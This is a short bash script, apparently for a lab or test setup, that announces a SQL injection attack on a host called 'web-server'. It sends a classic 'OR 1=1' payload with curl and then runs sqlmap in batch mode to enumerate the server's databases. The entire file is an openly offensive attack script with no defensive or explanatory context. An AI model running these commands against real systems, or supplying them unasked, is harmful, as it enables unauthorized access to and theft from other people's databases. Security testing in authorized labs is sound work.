#!/bin/bash

echo "Starting SQL injection attack against web-server"

# Basic SQL injection attack
curl "http://web-server/index.php?id=1%20OR%201=1"

# More advanced SQL injection using sqlmap
sqlmap -u "http://web-server/index.php?id=1" --batch --dbs